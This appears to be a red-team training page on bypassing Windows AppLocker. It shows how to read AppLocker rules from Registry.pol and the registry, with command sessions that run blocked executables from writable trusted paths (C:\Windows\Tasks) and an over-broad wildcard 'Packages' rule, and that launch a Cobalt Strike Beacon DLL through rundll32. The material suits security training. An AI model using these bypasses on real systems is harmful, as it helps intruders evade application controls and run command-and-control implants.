The difficulty of bypassing AppLocker depends on the robustness of the rules that have been implemented. The default rule sets are quite trivial to bypass in a number of ways:

1.  Executing untrusted code via trusts LOLBAS's.
2.  Finding writeable directories within "trusted" paths.
3.  By default, AppLocker is not even applied to Administrators.

It is of course common for system administrators to add custom rules to cater for particular software requirements. Badly written or overly permissive rules can open up loopholes that we can take advantage of.

Like LAPS, AppLocker creates a `Registry.pol` file in the `GpcFileSysPath` of the GPO which we can read with the `Parse-PolFile` cmdlet. This is one of the default rules.
```
KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\921cc481-6e17-4653-8f75-050b80acca20
ValueName   : Value
ValueType   : REG_SZ
ValueLength : 736
ValueData   : <FilePathRule Id="921cc481-6e17-4653-8f75-050b80acca20"
                Name="(Default Rule) All files located in the Program Files folder"
                Description="Allows members of the Everyone group to run applications that are located in the Program Files folder."
                UserOrGroupSid="S-1-1-0"
                Action="Allow">
                <Conditions>
                  <FilePathCondition Path="%PROGRAMFILES%\*"/>
                </Conditions>
              </FilePathRule>
```


AppLocker rules applied to a host can also be read from the local registry at `HKLM\Software\Policies\Microsoft\Windows\SrpV2`.

Interestingly, Cobalt Strike's `jump psexec[64]` still works against the default AppLocker rules, because it will upload a service binary into `C:\Windows`, which is a trusted location and thus allowed to execute.

Uploading into `C:\Windows` requires elevated privileges, but there are places like `C:\Windows\Tasks` that are writeable by standard users. These areas are useful in cases where you have access to a machine (e.g. in an assumed breach scenario), and need to break out of AppLocker to run post-ex tooling.

```
C:\Users\Administrator\Desktop>test.exe
This program is blocked by group policy. For more information, contact your system administrator.

C:\Users\Administrator\Desktop>move test.exe C:\Windows\Tasks
        1 file(s) moved.

C:\Users\Administrator\Desktop>C:\Windows\Tasks\test.exe
Bye-Bye AppLocker!
```

This is an example of an overly permissive rule.

```
KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\3470949d-4a86-4ec5-aa37-5ad7acd6a925
ValueName   : Value
ValueType   : REG_SZ
ValueLength : 482
ValueData   : <FilePathRule Id="3470949d-4a86-4ec5-aa37-5ad7acd6a925"
                Name="Packages"
                Description="Allow custom packages"
                UserOrGroupSid="S-1-1-0"
                Action="Allow">
                  <Conditions>
                    <FilePathCondition Path="%OSDRIVE%\*\Packages\*"/>
                  </Conditions>
                </FilePathRule>
```
  

The path `%OSDRIVE%\*\Packages\*` expands to `C:\*\Packages\*`, (assuming `C:\` is indeed the OS drive, which it almost always is) - this means we could create a folder called `Packages` anywhere on `C:\` and run exe's from it because of the wildcards.

```
C:\Users\Administrator\Desktop>test.exe
This program is blocked by group policy. For more information, contact your system administrator.


C:\Users\Administrator\Desktop>mkdir Packages

C:\Users\Administrator\Desktop>move test.exe Packages
        1 file(s) moved.

C:\Users\Administrator\Desktop>Packages\test.exe
Bye-Bye AppLocker!
```

  

  
DLL enforcement very rarely enabled due to the additional load it can put on a system, and the amount of testing required to ensure nothing will break.

  

![](https://rto-assets.s3.eu-west-2.amazonaws.com/applocker/dll-rules.png)

  

Cobalt Strike can output Beacon to a DLL that can be run with **rundll32**.

```
C:\Users\Administrator\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 8A6C-CD61

 Directory of C:\Users\Administrator\Desktop

05/17/2021  11:01 PM    <DIR>          .
05/17/2021  11:01 PM    <DIR>          ..
05/17/2021  10:59 PM           311,808 beacon.dll

C:\>C:\Windows\System32\rundll32.exe C:\Users\Administrator\Desktop\beacon.dll,StartW
```


```
beacon> link dc-1
[+] established link to child beacon: 10.10.15.75
```

If you have access to a Domain Controller or a machine with the appropriate packages installed, you can also enumerate the AppLocker configuration using the native GPO report commands - the `Get-GPOReport` cmdlet and `gpresult` utility.  The most convenient means of consuming the output is to save the report in HTML format, download it to your machine and open in a browser.